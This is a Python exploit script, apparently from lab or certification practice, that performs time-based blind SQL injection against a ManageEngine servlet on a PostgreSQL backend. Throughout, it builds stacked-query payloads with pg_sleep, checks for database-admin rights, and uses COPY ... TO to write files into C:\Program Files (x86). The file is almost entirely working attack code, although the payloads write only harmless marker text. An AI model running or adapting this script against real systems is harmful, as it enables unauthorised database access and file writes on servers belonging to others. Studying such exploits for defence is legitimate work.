from bsqli.queries import QUERIES
from bsqli.bsqli import blind_query
from bsqli.bsqli import question
from bsqli.bsqli import get_length
from bsqli.bsqli import get_count
from bsqli.bsqli import binary_search
from bsqli.bsqli import get_string
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

req = lambda url: requests.get(url, verify=False)
conditional_error = lambda response: response.elapsed.total_seconds() >= 10
# SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END

blind_sqli_truthy = lambda url, sub_query, comment: F"{url};SELECT CASE WHEN ({sub_query}) THEN pg_sleep(10) ELSE pg_sleep(0) END;{comment}"
url = "https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1"
query_encoder_0 = lambda s: s.replace(' ','+')
query_encoder_1 = lambda s: s.replace('\'','$$')
print(query_encoder_0(blind_sqli_truthy(url,'1=1','')))

'''
# verify the time-based blind is working programatically
ret = blind_query(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    sub_query='1=1',
    query_encoder=query_encoder_0,
    comment="",
    debug=False
)
print(F'blind query test: {ret}')
'''
# Check DB admin priveledges
ret = blind_query(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    sub_query=query_encoder_1(QUERIES['POSTGRESQL']['CURRENT_USER_IS_DB_ADMIN']()),
    query_encoder=query_encoder_0,
    comment="",
    debug=False
)
print(F'Are we db admin?: {ret}')

# Write to filesystem
write_to_filesystem_query = lambda url, sub_query, comment: query_encoder_1(F"{url};copy (select 'trahniz') to 'C:\\Program Files (x86)\\zinhart.txt';SELECT CASE WHEN ({sub_query}) THEN pg_sleep(10) ELSE pg_sleep(0) END;{comment}")
ret = blind_query(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=write_to_filesystem_query,
    sub_query='1=1',
    query_encoder=query_encoder_0,  
    debug=False
)
print(F'Write To file system was a success? {ret}')
# Read from filesystem
read_from_filesystem_query = '''
CREATE TEMP TABLE ZINHART(donkey text);
INSERT INTO ZINHART(donkey) VALUES ('Donkeys eat hay');
COPY ZINHART(donkey) TO 'C:\Program Files (x86)\donkey.txt';
Drop table ZINHART;
'''
#print(query_encoder_0(query_encoder_1(read_from_filesystem_query)))
'''
ret = blind_query(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    sub_query=query_encoder_1(write_to_filesystem_query),
    query_encoder=query_encoder_0,
    comment="",
    debug=False
)
print(F'Write To file system was a success? {ret}')
'''

